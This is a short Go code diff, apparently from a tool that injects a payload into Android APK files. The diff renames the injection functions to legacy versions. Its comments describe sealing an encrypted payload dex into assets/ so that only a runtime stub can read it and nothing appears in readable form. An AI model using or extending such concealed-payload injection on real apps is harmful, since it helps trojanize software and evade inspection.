@@ -96,7 +96,10 @@ func copyFileContents(src, dst string) (err error) {
 	return
 }
 
-func Inject(path string, zipModifiedOutput string) {
+// injectLegacy is the original filesystem round-trip implementation. It is kept
+// only until the streaming path (inject_zip.go) has been validated on the whole
+// corpus; see Inject for why unpacking to disk is unsafe.
+func injectLegacy(path string, zipModifiedOutput string) {
 
 	if _, err := os.Stat(zipOutput); err == nil {
 		err := os.RemoveAll(zipOutput)
@@ -168,7 +171,7 @@ func Inject(path string, zipModifiedOutput string) {
 		if utils.Payload_option == int(utils.Assets_payload) {
 			// The real payload never becomes a classesN.dex: it is sealed into
 			// assets/ and only the stub above knows how to open it.
-			sealAssetsPayload(zipOutput)
+			sealAssetsPayloadLegacy(zipOutput)
 		}
 	} else {
 		// patch out Application final modifier
@@ -219,7 +222,7 @@ func Inject(path string, zipModifiedOutput string) {
 // sealAssetsPayload encrypts the payload dex into assets/<AssetName> inside the
 // unzipped APK tree. The stub dex reads it back at runtime; nothing lands in the
 // APK in readable form (see pkg/assetpayload for the format and its limits).
-func sealAssetsPayload(zipOutput string) {
+func sealAssetsPayloadLegacy(zipOutput string) {
 	payloadDex := os.Getenv("ARCHINOME_ASSETS_DEX")
 	if payloadDex == "" {
 		payloadDex = payload_assets_dyn_name
